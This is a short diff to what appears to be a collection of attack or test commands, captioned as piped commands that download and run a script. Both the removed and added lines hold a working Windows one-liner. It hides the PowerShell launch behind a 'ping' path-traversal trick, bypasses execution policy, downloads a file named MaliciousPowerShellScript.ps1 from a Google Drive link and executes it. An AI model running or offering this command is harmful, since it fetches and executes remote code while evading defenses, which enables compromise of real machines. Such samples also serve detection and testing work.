@@ -1,3 +1,3 @@
 Piped commands to directly download a script and run that script
 
-cmd.exe /c "ping 127.0.0.1/../../../../../../../Windows/system32/WindowsPowerShell/v1.0/powershell.exe" -ExecutionPolicy bypass (Invoke-WebRequest -uri 'https://drive.google.com/uc?export=download&id=1qt2txRC4P3cHYVymX7PqgUTTjoEx5Hdb' -outfile 'c:\temp\MaliciousPowerShellScript.ps1') (invoke-expression 'c:/temp/MaliciousPowerShellScript.ps1')
+cmd.exe /c "ping 127.0.0.1/../../../../../../../Windows/system32/WindowsPowerShell/v1.0/powershell.exe" -ExecutionPolicy bypass (Invoke-WebRequest -uri 'https://drive.google.com/uc?export=download&id=1qt2txRC4P3cHYVymX7PqgUTTjoEx5Hdb' -outfile 'c:\temp\MaliciousPowerShellScript.ps1') invoke-expression 'c:/temp/MaliciousPowerShellScript.ps1'
